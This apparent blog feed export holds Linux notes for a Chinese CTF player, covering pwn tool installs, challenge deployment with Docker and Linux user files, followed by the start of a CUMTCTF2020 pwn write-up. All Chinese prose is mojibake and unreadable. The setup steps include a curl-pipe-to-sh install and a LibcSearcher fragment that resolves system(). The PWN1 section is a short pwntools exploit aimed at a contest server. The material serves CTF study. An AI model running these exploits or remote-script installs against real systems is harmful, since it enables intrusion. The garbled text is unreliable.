    <content type="html"><![CDATA[<p>ä¸»è¦è®°å½•ä¸€äº›åŸºç¡€çš„linuxçŸ¥è¯†</p><h1 id="0x01-å®‰è£…PWNç¯å¢ƒ"><a href="#0x01-å®‰è£…PWNç¯å¢ƒ" class="headerlink" title="0x01 å®‰è£…PWNç¯å¢ƒ"></a>0x01 å®‰è£…PWNç¯å¢ƒ</h1><p>è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹ä»0å¼€å§‹å®‰è£…pwnç¯å¢ƒ</p><h2 id="1-vmtools"><a href="#1-vmtools" class="headerlink" title="1.vmtools"></a>1.vmtools</h2><p>å…ˆæŒ‚è½½ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar zxpf VMwareTools-x.x.x-yyyy.tar.gz</span><br><span class="line">cd vmware-tools-distrib</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure><p>å®‰è£…å…ˆè¾“YES</p><p>ä¹‹åç›´æ¥å›è½¦</p><h2 id="2-å®‰è£…git"><a href="#2-å®‰è£…git" class="headerlink" title="2.å®‰è£…git"></a>2.å®‰è£…git</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h2 id="3-å®‰è£…pip"><a href="#3-å®‰è£…pip" class="headerlink" title="3.å®‰è£…pip"></a>3.å®‰è£…pip</h2><p>pip2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><p>pip3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><h2 id="4-å®‰è£…vim"><a href="#4-å®‰è£…vim" class="headerlink" title="4.å®‰è£…vim"></a>4.å®‰è£…vim</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove vim-common</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><h2 id="5-å®‰è£…pwntools"><a href="#5-å®‰è£…pwntools" class="headerlink" title="5.å®‰è£…pwntools"></a>5.å®‰è£…pwntools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="6-å®‰è£…libcSearcher"><a href="#6-å®‰è£…libcSearcher" class="headerlink" title="6.å®‰è£…libcSearcher"></a>6.å®‰è£…libcSearcher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">sudo python setup.py install</span><br><span class="line">æŠŠLibcSearcher.pyæ”¾åœ¨expç›¸åŒç›®å½•ä¸‹è¿è¡Œexp.pyå³å¯</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å…ˆå®‰è£…libcåº“</span><br><span class="line">expç‰‡æ®µï¼š</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf&#x3D;ELF(&#39;libc.xx.xx&#39;)</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">sys_addr &#x3D; offset + libc.dump(&#39;system&#39;)</span><br></pre></td></tr></table></figure><h2 id="7-å®‰è£…One-gadget"><a href="#7-å®‰è£…One-gadget" class="headerlink" title="7.å®‰è£…One_gadget"></a>7.å®‰è£…One_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="8-å®‰è£…pwndbg"><a href="#8-å®‰è£…pwndbg" class="headerlink" title="8.å®‰è£…pwndbg"></a>8.å®‰è£…pwndbg</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure><h2 id="9-å®‰è£…ssh"><a href="#9-å®‰è£…ssh" class="headerlink" title="9.å®‰è£…ssh"></a>9.å®‰è£…ssh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br><span class="line">&#x2F;&#x2F;å¼€å¯æœåŠ¡</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure><p><strong>é…ç½®æ–‡ä»¶/etc/ssh/sshd_config</strong></p><h2 id="10-å®‰è£…conda"><a href="#10-å®‰è£…conda" class="headerlink" title="10.å®‰è£…conda"></a>10.å®‰è£…conda</h2><p>condaæ˜¯ä¸€ä¸ªå¼€æºçš„è½¯ä»¶åŒ…ç®¡ç†ç³»ç»Ÿå’Œç¯å¢ƒç®¡ç†ç³»ç»Ÿï¼Œç”¨äºå®‰è£…å¤šä¸ªç‰ˆæœ¬çš„è½¯ä»¶åŒ…åŠå…¶ä¾èµ–å…³ç³»ï¼Œå¹¶åœ¨å®ƒä»¬ä¹‹é—´è½»æ¾åˆ‡æ¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"></span><br><span class="line">chmod 777 Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">sh Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;é…ç½®æº</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;</span><br><span class="line">conda config --set show_channel_urls yes </span><br><span class="line">conda config --get channels</span><br><span class="line">&#x2F;&#x2F;åˆ é™¤é…ç½®æº</span><br><span class="line">conda config --remove-key channels</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ç¯å¢ƒå‘½ä»¤</span><br><span class="line">conda env list</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;åˆ›å»ºç¯å¢ƒ</span><br><span class="line">conda create -n 3.6.7 python&#x3D;3.6.7</span><br><span class="line">&#x2F;&#x2F;åˆ‡æ¢ç¯å¢ƒ</span><br><span class="line">conda activate</span><br><span class="line">&#x2F;&#x2F;é€€å‡ºç¯å¢ƒ</span><br><span class="line">conda deactivate</span><br><span class="line">&#x2F;&#x2F;ç§»é™¤ç¯å¢ƒ</span><br><span class="line">conda remove -n env_name --all</span><br></pre></td></tr></table></figure><h1 id="0x02-ä¸€äº›å‘½ä»¤"><a href="#0x02-ä¸€äº›å‘½ä»¤" class="headerlink" title="0x02 ä¸€äº›å‘½ä»¤"></a>0x02 ä¸€äº›å‘½ä»¤</h1><h1 id="0x03éƒ¨ç½²pwné¢˜ç›®"><a href="#0x03éƒ¨ç½²pwné¢˜ç›®" class="headerlink" title="0x03éƒ¨ç½²pwné¢˜ç›®"></a>0x03éƒ¨ç½²pwné¢˜ç›®</h1><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a></p><h1 id="pwn-deploy-chrootä»‹ç»"><a href="#pwn-deploy-chrootä»‹ç»" class="headerlink" title="pwn_deploy_chrootä»‹ç»"></a>pwn_deploy_chrootä»‹ç»</h1><h2 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h2><blockquote><ol><li>ä¸€æ¬¡å¯ä»¥éƒ¨ç½²å¤šä¸ªé¢˜ç›®åˆ°ä¸€ä¸ªdockerå®¹å™¨ä¸­</li><li>è‡ªåŠ¨ç”Ÿæˆflag,å¹¶å¤‡ä»½åˆ°å½“å‰ç›®å½•</li><li>ä¹Ÿæ˜¯åŸºäºxinted + docker + chroot</li><li>åˆ©ç”¨pythonè„šæœ¬æ ¹æ®pwnçš„æ–‡ä»¶åè‡ªåŠ¨åŒ–åœ°ç”Ÿæˆ3ä¸ªæ–‡ä»¶ï¼špwn.xinetdï¼ŒDockerfileå’Œdocker-compose.yml</li><li>åœ¨/binç›®å½•ï¼Œåˆ©ç”¨è‡ªå·±ç¼–å†™çš„é™æ€ç¼–è¯‘çš„catflagç¨‹åºä½œä¸º/bin/sh,è¿™æ ·çš„è¯ï¼Œsystem(â€œ/bin/shâ€)å®é™…æ‰§è¡Œçš„åªæ˜¯è¯»å–flagæ–‡ä»¶çš„å†…å®¹ï¼Œå®Œå…¨ä¸ç»™æ…å±æ£ä»»ä½•æ“ä½œçš„ä½™åœ°</li><li>é»˜è®¤ä»10000ç«¯å£ç›‘å¬ï¼Œå¤šä¸€ä¸ªç¨‹åºå°±+1ï¼Œèµ·å§‹çš„ç›‘å¬ç«¯å£å¯ä»¥åœ¨config.pyé…ç½®ï¼Œæˆ–è€…ç”Ÿæˆpwn.xinetdå’Œdocker-compose.ymlåè‡ªå·±ä¿®æ”¹è¿™ä¸¤ä¸ªæ–‡ä»¶</li></ol></blockquote><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…docker</span><br><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br><span class="line"># å®‰è£… docker compose å’Œgit</span><br><span class="line">apt install docker-compose git</span><br><span class="line"># ä¸‹è½½</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åªéœ€è¦3æ­¥ï¼š</p><blockquote><ol><li>å°†æ‰€æœ‰pwné¢˜ç›®æ”¾å…¥binç›®å½•ï¼ˆæ³¨æ„åå­—ä¸å¸¦ç‰¹æ®Šå­—ç¬¦ï¼Œå› ä¸ºä¼šå°†æ–‡ä»¶åä½œä¸ºlinuxç”¨æˆ·åï¼‰</li><li>python <a href="http://initialize.py/" target="_blank" rel="noopener">initialize.py</a></li><li>docker-compose up â€”build -d</li></ol></blockquote><p>ä¸‹é¢ç»™ä¸‹è¯¦ç»†æ“ä½œï¼š</p><p>1ã€å°†ä½ è¦éƒ¨ç½²çš„pwné¢˜ç›®æ”¾åˆ°binç›®å½•</p><p>æˆ‘çš„é¡¹ç›®å·²ç»å°†ä¸€ä¸ªç¨‹åºcopyäº†3åˆ†ä½œä¸ºç¤ºä¾‹ï¼Œæ³¨æ„æ–‡ä»¶åä¸è¦å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ–‡ä»¶åå»ºè®®ä½¿ç”¨å­—æ¯ï¼Œä¸‹åˆ’çº¿ï¼Œæ¨ªæ†å’Œæ•°å­—ï¼Œå½“ç„¶å…¨å­—æ¯çš„å½“ç„¶æœ€å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# ls bin&#x2F;</span><br><span class="line">pwn1  pwn1_copy1  pwn1_copy2</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>2ã€<a href="http://xn--initialize-3f62aw61d.py/" target="_blank" rel="noopener">è¿è¡Œinitialize.py</a></p><p>è¿è¡Œè„šæœ¬åä¼šè¾“å‡ºæ¯ä¸ªpwnçš„ç›‘å¬ç«¯å£ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# python initialize.py</span><br><span class="line"></span><br><span class="line">pwn1&#39;s port: 10000</span><br><span class="line">pwn1_copy1&#39;s port: 10001</span><br><span class="line">pwn1_copy2&#39;s port: 10002</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸ç«¯å£ä¿¡æ¯ï¼Œè¿˜æœ‰éšæœºç”Ÿæˆçš„flagé»˜è®¤å¤‡ä»½åˆ°flags.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# cat flags.txt </span><br><span class="line">pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;</span><br><span class="line">pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;</span><br><span class="line">pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;</span><br><span class="line"></span><br><span class="line">pwn1&#39;s port: 10000</span><br><span class="line">pwn1_copy1&#39;s port: 10001</span><br><span class="line">pwn1_copy2&#39;s port: 10002</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>3ã€å¯åŠ¨ç¯å¢ƒ</p><p>è¯·ä½¿ç”¨rootç”¨æˆ·æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up --build -d</span><br></pre></td></tr></table></figure><p>ä¸å‡ºæ„å¤–ï¼Œé¢˜ç›®å°±å¯åŠ¨èµ·æ¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# netstat -antp | grep docker</span><br><span class="line">tcp6       0      0 :::10002                :::*                    LISTEN      19828&#x2F;docker-proxy</span><br><span class="line">tcp6       0      0 :::10000                :::*                    LISTEN      19887&#x2F;docker-proxy</span><br><span class="line">tcp6       0      0 :::10001                :::*                    LISTEN      19873&#x2F;docker-proxy</span><br></pre></td></tr></table></figure><h1 id="0x06-ç”¨æˆ·å’Œæƒé™"><a href="#0x06-ç”¨æˆ·å’Œæƒé™" class="headerlink" title="0x06 ç”¨æˆ·å’Œæƒé™"></a>0x06 ç”¨æˆ·å’Œæƒé™</h1><h2 id="1-ç”¨æˆ·"><a href="#1-ç”¨æˆ·" class="headerlink" title="1.ç”¨æˆ·"></a>1.ç”¨æˆ·</h2><h3 id="1-1-ç”¨æˆ·æ ‡è¯†å·"><a href="#1-1-ç”¨æˆ·æ ‡è¯†å·" class="headerlink" title="1.1 ç”¨æˆ·æ ‡è¯†å·"></a>1.1 ç”¨æˆ·æ ‡è¯†å·</h3><p>0ï¼š rootï¼Œè¶…çº§ç”¨æˆ·ã€‚<br>1-499ï¼šç³»ç»Ÿç”¨æˆ·ï¼Œä¿è¯ç³»ç»ŸæœåŠ¡æ­£å¸¸è¿è¡Œï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ã€‚<br>500-60000ï¼šæ™®é€šç”¨æˆ·ï¼Œå¯ç™»å½•ç³»ç»Ÿï¼Œæ‹¥æœ‰ä¸€å®šçš„æƒé™ã€‚ç®¡ç†å‘˜æ·»åŠ çš„ç”¨æˆ·åœ¨æ­¤èŒƒå›´å†…ã€‚</p><p>ç”¨æˆ·åå’Œæ ‡è¯†å·ä¸ä¸€å®šä¸€ä¸€å¯¹åº”ï¼ŒLinuxå…è®¸å‡ ä¸ªç™»å½•åå¯¹åº”åŒä¸€ä¸ªç”¨æˆ·æ ‡è¯†å·ã€‚</p><p>ç³»ç»Ÿå†…éƒ¨ç®¡ç†è¿›ç¨‹å’Œæ–‡ä»¶è®¿é—®æƒé™æ—¶ä½¿ç”¨ç”¨æˆ·æ ‡è¯†å·ã€‚</p><p>è´¦å·å’Œæ ‡è¯†å·çš„å¯¹åº”å…³ç³»åœ¨/etc/passwdæ–‡ä»¶ä¸­ã€‚</p><h3 id="1-2-etc-passwd"><a href="#1-2-etc-passwd" class="headerlink" title="1.2 /etc/passwd"></a>1.2 /etc/passwd</h3><p><strong>è¯¥æ–‡ä»¶æ‰€æœ‰è€…å’Œæ‰€å±ç»„ä¸ºroot</strong>ï¼Œé™¤äº†rootç”¨æˆ·å¤–åªæœ‰è¯»å–çš„æƒé™ã€‚</p><p>æ ¼å¼ä¸º</p><p>ç™»å½•åï¼šå£ä»¤ï¼šç”¨æˆ·æ ‡è¯†å·ï¼šç»„æ ‡è¯†å·ï¼šæ³¨é‡Šï¼šç”¨æˆ·ä¸»ç›®å½•ï¼šShellç¨‹åº</p><blockquote><p>ç™»å½•åï¼šåŒæ„ç³»ç»Ÿä¸­å”¯ä¸€ï¼Œå¤§å°æ•æ„Ÿã€‚<br>å£ä»¤ï¼šå¯†ç ï¼Œrootå’Œç”¨æˆ·å¯ä½¿ç”¨passwdå‘½ä»¤ä¿®æ”¹ã€‚<br>ç”¨æˆ·æ ‡è¯†å·ï¼šå”¯ä¸€ã€‚<br>ç»„æ ‡è¯†å·ï¼šæ¯ä¸ªç”¨æˆ·å¯ä»¥åŒæ—¶å±äºå¤šä¸ªç»„ã€‚<br>æ³¨é‡Šï¼šç›¸å…³ä¿¡æ¯ï¼ŒçœŸå®å§“åã€è”ç³»ç”µè¯ç­‰ã€‚mailå’Œfingerç­‰ä¼šä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚<br>ç”¨æˆ·ä¸»ç›®å½•ï¼šç”¨æˆ·ç™»å½•åçš„é»˜è®¤å·¥ä½œç›®å½•ã€‚rootä¸º/rootï¼Œä¸€èˆ¬ç”¨æˆ·åœ¨/homeä¸‹ã€‚<br>Shellç¨‹åºï¼šç™»å½•åé»˜è®¤å¯åŠ¨çš„Shellç¨‹åºã€‚</p></blockquote><h3 id="1-3-etc-shadow"><a href="#1-3-etc-shadow" class="headerlink" title="1.3 /etc/shadow"></a>1.3 /etc/shadow</h3><p>åŒ…å«ç”¨æˆ·çš„å¯†ç å’Œè¿‡æœŸæ—¶é—´ï¼Œåªæœ‰rootç»„å¯è¯»å†™ã€‚</p><p>æ ¼å¼ä¸º</p><p>ç™»å½•åï¼šåŠ å¯†å£ä»¤ï¼šæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€å°æ—¶é—´é—´éš”ï¼šæœ€å¤§æ—¶é—´é—´éš”ï¼šè­¦å‘Šæ—¶é—´ï¼šå¯†ç ç¦ç”¨æœŸï¼šè´¦æˆ·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ</p><blockquote><p>ç™»å½•åï¼šç•¥ã€‚<br>åŠ å¯†å£ä»¤ï¼š*è¡¨ç¤ºè´¦æˆ·è¢«é”å®šï¼Œï¼è¡¨ç¤ºå¯†ç è¢«é”å®šã€‚å…¶ä»–çš„å‰ä¸‰ä½è¡¨ç¤ºåŠ å¯†æ–¹å¼ã€‚<br>æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€è¿‘ä¿®æ”¹å¯†ç çš„æ—¶é—´ï¼Œå¤©ä¸ºå•ä½ï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ã€‚<br>æœ€å°æ—¶é—´é—´éš”ï¼šæœ€å°ä¿®æ”¹å¯†ç çš„æ—¶é—´é—´éš”ã€‚<br>æœ€å¤§æ—¶é—´é—´éš”ï¼šæœ€é•¿å¯†ç æœ‰æ•ˆæœŸï¼Œåˆ°æœŸè¦æ±‚ä¿®æ”¹å¯†ç ã€‚<br>è­¦å‘Šæ—¶é—´ï¼šå¯†ç è¿‡æœŸåå¤šä¹…å‘å‡ºè­¦å‘Šã€‚<br>å¯†ç ç¦ç”¨æœŸï¼šå¯†ç è¿‡æœŸåä»ç„¶æ¥å—çš„æœ€é•¿æœŸé™ã€‚<br>è´¦å·å¤±æ•ˆæ—¶é—´ï¼šè´¦æˆ·çš„æœ‰æ•ˆæœŸï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ï¼Œç©ºä¸²è¡¨ç¤ºæ°¸ä¸è¿‡æœŸã€‚<br>ä¿ç•™å­—æ®µï¼šä¿ç•™å°†æ¥ä½¿ç”¨ã€‚</p></blockquote><h2 id="2-ç”¨æˆ·ç»„"><a href="#2-ç”¨æˆ·ç»„" class="headerlink" title="2.ç”¨æˆ·ç»„"></a>2.ç”¨æˆ·ç»„</h2><p>Linuxæœ¬èº«é¢„å®šä¹‰äº†è®¸å¤šç”¨æˆ·ç»„ï¼ŒåŒ…æ‹¬rootã€daemonã€binã€sysç­‰ï¼Œç”¨æˆ·å¯æ ¹æ®éœ€è¦è‡ªè¡Œæ·»åŠ ç”¨æˆ·ç»„ã€‚</p><p>ç”¨æˆ·ç»„æ‹¥æœ‰ç»„åã€ç»„æ ‡è¯†å·ã€ç»„æˆå‘˜ç­‰å±æ€§ã€‚</p><h3 id="2-1-etc-group"><a href="#2-1-etc-group" class="headerlink" title="2.1 /etc/group"></a>2.1 /etc/group</h3><p>æ ¼å¼ä¸º</p><p>ç»„åï¼šå£ä»¤ï¼šç»„æ ‡è¯†å·ï¼šæˆå‘˜åˆ—è¡¨</p><h2 id="3-ç”¨æˆ·ç®¡ç†"><a href="#3-ç”¨æˆ·ç®¡ç†" class="headerlink" title="3. ç”¨æˆ·ç®¡ç†"></a>3. ç”¨æˆ·ç®¡ç†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//add</span><br><span class="line">useradd [option] ç™»å½•å</span><br><span class="line">//å¦‚æœæ²¡æœ‰æŒ‡å®šâ€“systemå’Œâ€“groupé€‰é¡¹ï¼Œåˆ™åˆ›å»ºæ™®é€šç”¨æˆ·ã€‚</span><br><span class="line">adduser [option] user</span><br><span class="line"></span><br><span class="line">//del</span><br><span class="line">userdel [option] ç”¨æˆ·å</span><br><span class="line">-fï¼šå¼ºåˆ¶åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</span><br><span class="line">-rï¼šä¸»ç›®å½•ä¸­çš„æ–‡ä»¶ä¸€å¹¶åˆ é™¤ã€‚</span><br><span class="line"></span><br><span class="line">//edit passwd</span><br><span class="line">passwd [option] ç™»å½•å</span><br><span class="line"></span><br><span class="line">//show user information</span><br><span class="line">id [option] [ç”¨æˆ·]</span><br><span class="line"></span><br><span class="line">//change user</span><br><span class="line">su [option] [ç”¨æˆ·å]</span><br></pre></td></tr></table></figure><h2 id="4-ç”¨æˆ·ç»„ç®¡ç†"><a href="#4-ç”¨æˆ·ç»„ç®¡ç†" class="headerlink" title="4.ç”¨æˆ·ç»„ç®¡ç†"></a>4.ç”¨æˆ·ç»„ç®¡ç†</h2><p>æŠŠuseræ¢æˆgroup</p><h1 id="0x07-ä¸€äº›å°é—®é¢˜"><a href="#0x07-ä¸€äº›å°é—®é¢˜" class="headerlink" title="0x07 ä¸€äº›å°é—®é¢˜"></a>0x07 ä¸€äº›å°é—®é¢˜</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸»è¦è®°å½•ä¸€äº›åŸºç¡€çš„linuxçŸ¥è¯†&lt;/p&gt;
&lt;h1 id=&quot;0x01-å®‰è£…PWNç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#0x01-å®‰è£…PWNç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;0x01 å®‰è£…PWNç¯å¢ƒ&quot;&gt;&lt;/a&gt;0x01 å®‰è£…PWNç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;è¿™é‡Œä¸»è¦è®°å½•</summary>
      
    
    
    
    <category term="linux" scheme="https://pz1o.top/categories/linux/"/>
    
    
    <category term="linux" scheme="https://pz1o.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020å²æœ«èµ›</title>
    <link href="https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/</id>
    <published>2020-12-26T14:32:03.000Z</published>
    <updated>2020-12-28T02:24:43.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUMTCTF2020å²æœ«èµ›"><a href="#CUMTCTF2020å²æœ«èµ›" class="headerlink" title="CUMTCTF2020å²æœ«èµ›"></a>CUMTCTF2020å²æœ«èµ›</h1><p>å­¦é•¿ä»¬å¯å¤ªæäº†ï¼Œæ¯”èµ›æœ€åå‚ç›´ä¸Šåˆ†å¯å¤ªç§€äº†</p><p><img src="/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png" alt="image-20201226220723157"></p><p>åªæ”¾PWNçš„é¢˜è§£äº†</p><p>ä¸‹é¢å‡ ä¸ªé¢˜å…ˆæ”¾é¢˜è§£ï¼Œç­‰æœŸæœ«è€ƒå®Œè¯•æ¥å¤ç°</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><p>\x00æˆªæ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"\x00"</span>*<span class="number">7</span> + p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>åœ¨1çš„åŸºç¡€ä¸Šputsæ³„éœ²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 